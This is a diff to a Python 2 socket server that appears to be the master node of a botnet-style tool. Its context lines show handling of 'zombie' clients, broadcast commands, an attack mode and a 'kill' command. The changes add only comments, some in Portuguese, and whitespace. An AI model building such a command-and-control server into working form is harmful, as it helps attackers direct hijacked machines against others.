@@ -12,6 +12,7 @@ class SocketServer(socket.socket):
             master_ip = sys.argv[3]
 
         socket.socket.__init__(self)
+        # master.py
         if len(sys.argv) < 3:
             local_ip = "127.0.0.1"
             local_port = 4545
@@ -23,6 +24,7 @@ class SocketServer(socket.socket):
         self.bind((local_ip, local_port))
         self.listen(5)
 
+    # Main control
     def run(self):
         print "Server started"
         try:
@@ -38,6 +40,7 @@ class SocketServer(socket.socket):
                 client.close()
             self.close()
 
+    # Rotina do servidor
     def accept_clients(self):
         while 1:
             (clientsocket, address) = self.accept()
@@ -53,8 +56,8 @@ class SocketServer(socket.socket):
             #Receiving data from client
             thread.start_new_thread(self.recieve, (clientsocket,))
 
+    # Rotina da conexão
     def recieve(self, client):
-
         # Lookup client role
         for i in self.clients:
             if i[0] == client:
@@ -125,7 +128,7 @@ class BasicChatServer(SocketServer):
             self.broadcast(message)
             client.send("Attack mode interrupted\n")
 
-        elif data.startswith("kill"):
+        elif data.startswith("kill"): 
             zombie_id = data.strip()[-1]
             if int(zombie_id) <= len(self.clients) and self.clients[int(zombie_id)][1] == "zombie":
                 print "Killing zombie " + zombie_id
